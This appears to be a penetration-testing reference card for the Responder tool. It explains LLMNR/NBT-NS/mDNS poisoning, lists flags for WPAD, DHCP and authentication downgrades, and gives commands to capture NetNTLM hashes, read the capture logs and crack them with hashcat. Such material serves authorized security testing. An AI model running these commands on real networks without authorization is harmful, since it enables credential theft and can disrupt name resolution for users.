# Responder

- **Category**: Password Attacks / Network Hash Capture
- **Risk Level**: 🔴 High

---

## Description

A tool for capturing NetNTLM hashes by poisoning LLMNR/NBT-NS/mDNS protocols. When an internal network user tries to access a non-existent hostname, DNS resolution fails and triggers a broadcast; Responder answers the broadcast, causing the victim to send NTLM authentication containing a hash that can be cracked offline with hashcat.

## Installation

```bash
sudo apt install responder
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-I IFACE` | Network interface to listen on (use 'ALL' for all interfaces) |
| `-A` | Analyze mode (listen only, no poisoning) |
| `-e IP` | Poison with a different IPv4 address than Responder's |
| `-6 IPv6` | Poison with a different IPv6 address than Responder's |
| `-w` | Start WPAD rogue proxy server |
| `-F` | Force NTLM/Basic auth on wpad.dat retrieval (may show prompt) |
| `-P` | Force proxy authentication (highly effective, can't use with -w) |
| `-d` | Enable DHCPv4 poisoning with WPAD injection |
| `-D` | Inject DNS server (not WPAD) in DHCPv4 responses |
| `--dhcpv6` | Enable DHCPv6 poisoning (WARNING: may disrupt network) |
| `-b` | Return HTTP Basic auth instead of NTLM (cleartext passwords) |
| `--lm` | Force LM hashing downgrade (for Windows XP/2003) |
| `--disable-ess` | Disable Extended Session Security (NTLMv1 downgrade) |
| `-E` | Return STATUS_LOGON_FAILURE (enables WebDAV auth capture) |
| `-v` | Verbose output (recommended) |
| `-Q` | Quiet mode, minimal output |

## Common Commands

```bash
# Basic poisoning (most common)
sudo responder -I eth0

# With WPAD (more hash capture opportunities)
sudo responder -I eth0 -wd

# Analyze mode (listen without attacking, low risk)
sudo responder -I eth0 -A

# View captured hashes (newer Responder versions store logs here)
ls /usr/share/responder/logs/
cat /usr/share/responder/logs/Responder-Session.log
# Note: On some Kali versions, logs may be at /var/log/responder/ or the current directory
# Check: grep -i 'LogDir' /etc/responder/Responder.conf

# Crack captured NetNTLMv2 hashes
hashcat -m 5600 /usr/share/responder/logs/HTTP-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt
```

## Notes & Tips

1. Requires being on the same Layer-2 network (LAN) as the target — Responder cannot cross routed segments.
2. Modern Windows (Vista+) and enterprise environments often disable LLMNR via Group Policy; NBT-NS may still be exploitable.
3. Affects the entire LAN; there is a risk of detection by network monitoring — always run in analyze mode (`-A`) first.
4. Combine with mitm6 to capture credentials via IPv6 DHCP and mDNS, bypassing LLMNR/NBT-NS defenses.
5. ⚠️ Running Responder can disrupt legitimate name resolution on the LAN; always stop cleanly after testing (Ctrl+C).

---

## Official References

- [Responder (GitHub)](https://github.com/lgandx/Responder)
